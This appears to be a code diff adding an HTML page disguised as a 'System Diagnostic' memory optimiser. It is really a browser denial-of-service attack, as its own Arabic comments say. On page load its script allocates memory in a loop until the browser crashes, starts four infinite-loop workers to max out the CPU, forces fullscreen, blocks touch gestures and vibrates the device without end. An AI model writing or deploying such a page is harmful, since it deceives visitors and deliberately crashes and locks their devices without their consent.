@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>System Diagnostic</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #00ff00;
+            font-family: monospace;
+            overflow: hidden;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            touch-action: none; /* منع السكرول */
+        }
+        .spinner {
+            border: 8px solid #333;
+            border-top: 8px solid #00ff00;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 0.5s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #status { font-size: 18px; text-align: center; margin-bottom: 10px; }
+        #log { font-size: 12px; color: #888; text-align: center; width: 100%; word-wrap: break-word;}
+    </style>
+</head>
+<body>
+    <div class="spinner"></div>
+    <div id="status">Optimizing System Memory...</div>
+    <div id="log">Initializing...</div>
+
+    <script>
+        const logEl = document.getElementById("log");
+        let memoryHogs = [];
+        let isDestroying = true;
+
+        // 1. إغراق الذاكرة (RAM Exhaustion)
+        function startMemoryExhaustion() {
+            try {
+                // تخصيص 50 ميجابايت في كل دورة
+                const data = new Uint8Array(50 * 1024 * 1024);
+                memoryHogs.push(data);
+                logEl.innerText = `Allocated: ${memoryHogs.length * 50} MB\nDo not close this tab.`;
+                
+                // استدعاء الدالة باستمرار بدون تأخير
+                setTimeout(startMemoryExhaustion, 10); 
+            } catch (e) {
+                // إذا نفدت الذاكرة، المتصفح راح يكرش الصفحة
+                logEl.innerText = "Memory limit reached. Browser will crash.";
+            }
+        }
+
+        // 2. إغراق المعالج (CPU Exhaustion)
+        function startCPUExhaustion() {
+            const workerCode = `
+                let i = 0;
+                while(true) {
+                    i = (i + 1) % 1000000;
+                    let x = Math.sqrt(i) * Math.pow(i, 2);
+                }
+            `;
+            
+            // تشغيل 4 خيوط (Threads) عشان نضغط كل أنوية المعالج
+            for (let i = 0; i < 4; i++) {
+                try {
+                    const blob = new Blob([workerCode], { type: 'application/javascript' });
+                    const worker = new Worker(URL.createObjectURL(blob));
+                } catch (e) {}
+            }
+        }
+
+        // 3. قفل الشاشة ومنع الخروج
+        function lockScreen() {
+            // منع اللمس المتعدد
+            document.addEventListener('touchmove', function(e) { e.preventDefault(); }, { passive: false });
+            document.addEventListener('gesturestart', function(e) { e.preventDefault(); });
+            
+            // محاولة الدخول في وضع ملء الشاشة (إذا كان مدعوم)
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen().catch(() => {});
+            }
+
+            // الاهتزاز المستمر (إذا كان مدعوم في Safari)
+            if (navigator.vibrate) {
+                setInterval(() => navigator.vibrate([500, 200, 500]), 2000);
+            }
+        }
+
+        // تشغيل الهجوم
+        window.onload = function() {
+            logEl.innerText = "Starting allocation...";
+            setTimeout(() => {
+                startCPUExhaustion();
+                startMemoryExhaustion();
+                lockScreen();
+            }, 1000);
+        };
+    </script>
+</body>
+</html>
